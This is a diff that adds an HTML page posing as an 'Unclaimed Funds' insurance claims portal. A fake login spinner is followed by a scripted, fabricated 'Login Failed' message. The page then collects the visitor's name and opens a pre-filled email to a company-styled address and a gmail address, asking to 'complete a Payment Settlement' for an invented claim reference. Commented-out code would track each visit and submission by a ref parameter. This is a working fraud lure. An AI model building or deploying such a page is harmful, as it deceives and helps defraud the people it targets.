@@ -1,0 +1,385 @@
+<html>
+    <head>
+        <meta http-equiv="x-ua-compatible" content="EmulateIE9">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    
+    <link rel="icon" href="https://endlessicons.com/wp-content/uploads/2012/11/reset-icon.png" type="image/gif" sizes="16x16">
+
+     
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+        <title>
+        Client Help Desk - Unclaimed Funds Support Ticket
+        </title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+        <script type="text/javascript">
+        (function() {
+        })();
+        </script>
+        
+        <style>
+            input {
+                width: 100%;
+                height: 35px;
+  border-top-style: hidden;
+  border-right-style: hidden;
+  border-left-style: hidden;
+  border-bottom-style: hidden;
+  border-bottom: 2px solid rgb(255, 255, 255);
+
+
+  border-radius: 0px;
+  background-color: #323232fa;
+  outline: 0px solid;
+  outline-color: rgba(255, 255, 255, 0.815);
+  font-size: 13px;
+  text-align: center;
+  color: #ffffff;
+}
+
+
+#sub2{
+   
+    outline: 2px solid;
+}
+
+label{
+    font-size: 20px;
+    font-weight: 300;
+    text-decoration: bold;
+    padding-bottom: 2px;
+    padding-top: 2px;
+
+}
+
+#MSimg{
+    margin-bottom: -35px;
+    margin-top: -24px;
+    margin-left: -5px;
+}
+
+div{
+    outline: none;
+    padding: 0px;
+    padding-bottom: -5px;
+    padding-top: 0px;
+}
+
+.no-outline:focus {
+  outline: none;
+}
+
+body{
+  /* The image used */
+  background-color: rgba(0, 0, 0, 0.5); /* 50% opacity black background */
+  background-image: url('https://images.unsplash.com/photo-1643391448862-881a06885f90?q=80&w=2754&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D');
+
+  /* Full height */
+  height: 100%; 
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: repeat;
+  background-size: cover;
+}
+
+
+
+span{
+    padding-bottom: 10px;
+}
+
+#myFa {
+  margin-left: 205px;
+  margin-top: 25px;
+  z-index: 1;
+  color: white;
+}
+
+.formimage1{
+    
+box-shadow: 0px 10px 32px -5px rgba(0,0,0,0.52);
+-webkit-box-shadow: 0px 10px 32px -5px rgba(0,0,0,0.52);
+-moz-box-shadow: 0px 10px 32px -5px rgba(0,0,0,0.52);
+
+margin-top: 500px;
+
+width: 25%;
+height: 140px;
+}
+.ban_top{
+
+overflow: hidden;
+  position: fixed;
+  top: 0;
+  align-items: center;
+  width: 100%;
+  padding: 0px;
+  left: 0px;
+}
+
+.theframe{
+    display:block;
+z-index: 3;
+top: 10%;
+background-color: #000000c2;
+border: 0;
+width: 390px;
+padding: 25px;
+height: 70%;
+
+box-shadow: 0px 5px 20px -5px rgba(0,0,0,0.52);
+-webkit-box-shadow: 0px 5px 20px -5px rgba(0,0,0,0.52);
+-moz-box-shadow: 0px 5px 20px -5px rgba(0,0,0,0.52);
+
+
+}
+
+#divBar{
+    padding-bottom: 10px;
+    padding: 10px;
+}
+
+#headerFRM{
+    padding: 10px;
+    padding-bottom: 1px;
+}
+
+#submitbtn{
+    background-color: #eeeeeec5;
+    display: flex;
+    justify-content: center;
+    color: rgb(0, 0, 0);
+    width: 100%;
+    font-size: 14px;
+    height: 35px;
+    border-color: #eeeeeec5;
+    margin-bottom: 2%;
+    z-index: -1;
+
+}
+#submitbtn:hover{
+    background-color: rgba(19, 19, 19, 0.253);
+    color: white;
+
+}
+
+#sub2{
+    visibility: hidden;
+    background-color: rgba(19, 19, 19, 0.253);
+    display: flex;
+    justify-content: center;
+    color: rgb(255, 255, 255);
+    width: 100%;
+    font-size: 14px;
+    height: 35px;
+    border-color: #ebebebcc;
+    margin-top: -50px;
+    margin-bottom: -5%;
+    z-index: -1;
+}
+
+#sub2:hover{
+    background-color: #ebebebcc;
+    color: rgb(0, 0, 0);
+}
+   
+#rdB{
+    padding-bottom: 10px;
+    padding-top: 10px;
+    font-size: 11px;
+    color: #106ebe;
+} 
+
+#error-msg{
+    font-size: 11px;
+    color: #4a2323;
+    padding: 12px;
+    border: 1px solid;
+    border-radius: 2px;
+    background: #e6aeae;
+    visibility: hidden;
+}
+
+#containFrm{
+    position: flex;
+    display: flex;
+justify-content:center;
+align-items: center;
+margin-top: 15%;
+}
+
+#sms{
+    color: white;
+}
+
+#headTitle{
+    z-index: 10;
+    font-size: 24px;
+    color:#ffffff;
+}
+
+input{
+    margin-top: 15px;
+}
+        </style>
+        
+          
+    <script type="text/javascript" src="https://tiiny.host/ad-script.js"></script><script defer data-domain="goodwillprivatewealth.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script></head>
+    
+    <body onload="pageSet()">
+
+            <div id="containFrm">
+                
+                <div class="theframe">
+                    <img style="position: relative; left: 12%;" width="75%" src="https://goodwillprivatewealth.co.uk/help/logoinsure.png">
+                    <div id="headerFRM">
+                        <div style="display:flex; justify-content: center;">
+                        <img id="frameIcon" src="https://i.postimg.cc/tgCw9Qhf/Spinner-1s-200px.gif" width="40%" style="z-depth:4; padding-bottom: 15px; ">
+                    </div>
+                        <div style="display: flex; justify-content: center; text-align: center; flex-direction: column;">
+                        <h4 id="hdTxt" style="color: white; padding-bottom: 5px;">
+                         Login to Online Insurance Portal
+                    </h4>
+                    
+                    <p id="headTitle" style="font-size: 12px; font-weight: 400;">
+                        Please wait while log you into your claims portal.
+                    </p>
+                    <div id="detailBox" style="padding-block-end: 10px; visibility: hidden; height: 0;">
+                        <p id="errMsg" style="color: red; font-size: 11px; visibility: hidden">Please enter your Full Name and Valid Email Address</p>
+                    <input id="usrName" type="text" placeholder="Full Name">
+                    <input type="email"  placeholder="Email Address">
+
+                </div>
+                </div>
+                    </div>
+
+                        <input onClick='' style="margin-bottom: 20%" id="submitbtn" type="submit" value="Verifying...">
+                        <input onClick='send()' style="margin-bottom: 5%" id="sub2" type="submit" value="Send Inquiry" style="">
+                        <h6   id="sms" style="font-size: 12px; visibility: hidden; text-align: center; font-weight: 300;" style=" text-color: #ffffff;">
+                        Unable to click the button? <br>
+                        Please try opening the link with a different browser.
+                        </h6>
+                  </div> 
+                   
+                    
+              
+                </div>
+        
+        
+     <script>
+    var mainRef = '';
+     
+     
+     function sendVIsit(mainRef){
+
+        /*
+                 var xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        
+        xhr.addEventListener("readystatechange", function() {
+          if(this.readyState === 4) {
+            console.log(this.responseText);
+          }
+        });
+        
+        var a = "https://help.goodwillprivatewealth.uk/x.php?ref=" + mainRef + "&io=1";
+        
+        xhr.open("GET",a );
+        
+        xhr.send();
+        */
+     }
+     
+     
+       function sendSub(mainRef){
+        /*
+                 var xhr = new XMLHttpRequest();
+        xhr.withCredentials = true;
+        
+        xhr.addEventListener("readystatechange", function() {
+          if(this.readyState === 4) {
+            console.log(this.responseText);
+          }
+        });
+        
+        var a = "https://help.goodwillprivatewealth.uk/x.php?ref=" + mainRef + "&io=2";
+        
+        xhr.open("GET",a );
+        
+        xhr.send();
+        */
+       
+     }
+     
+     
+     function pageSet(){
+       
+        function getQueryParam(paramName) {
+    var urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(paramName);
+}
+
+  mainRef = getQueryParam('ref');
+    console.log('Value of query parameter:', mainRef);
+         
+         sendVIsit(mainRef);
+        
+               
+
+                $(document).ready(function(){
+    $('#theFrame').fadeIn(6000);});     
+               
+    
+    setTimeout(showReady, 6000);
+    
+     }
+
+     function send(){
+        
+            sendSub(mainRef);
+
+        name = document.getElementById('usrName').value;
+        var index = name.includes(" ");
+        var msg = "help@goodwillprivatewealth.co.uk,garrettsanford770@gmail.com?subject=Account%20%20Recovery%20**1209&body=Hi.%0A%0AI%20am%20" + name + "%2C%20and%20I%20am%20currently%20having%20issues%20logging%20into%20my%20account.%20I%20would%20like%20to%20complete%20a%20Payment%20Settlement%20for%20my%20pending%20claim%20Ref.%3A%20%23BGX107.%20Please%20assist%20me%20with%20regaining%20access%20to%20my%20portal.%0A%0AWarm%20Regards.%0A" + name;
+
+        if(name.length < 4 || index != true){
+                document.getElementById('errMsg').style.visibility = "visible";
+        }else{
+            location.replace("mailto:" + msg);
+            
+            //alert(msg)
+        }
+        
+     }
+
+     function showReady(){
+            
+            document.getElementById('submitbtn').style.visibility = "hidden";
+            document.getElementById('submitbtn').style.height = "10px";
+            document.getElementById('sub2').style.marginTop = "-50px";
+            document.getElementById('sub2').style.visibility = "visible";
+            document.getElementById('frameIcon').src = "https://i.postimg.cc/TYBqjQrp/check.png";
+
+            document.getElementById('frameIcon').style.visibility = "hidden";
+            document.getElementById('frameIcon').style.height = "0px";
+
+            document.getElementById('detailBox').style.visibility = "visible";
+            document.getElementById('detailBox').style.height = 'auto';
+
+            document.getElementById('hdTxt').innerHTML = "⚠ Login Failed";
+            document.getElementById('hdTxt').style.color = "Orange";
+            document.getElementById('headTitle').innerHTML = "We were unable to automatically log you into your insurance portal. Please fill in and submit the form for further assistance in completing your policy claim.";
+            document.getElementById('sms').style.visibility = "visible";
+     }
+     
+     
+        </script>
+        
+       
+        
+    </body>
+</html>
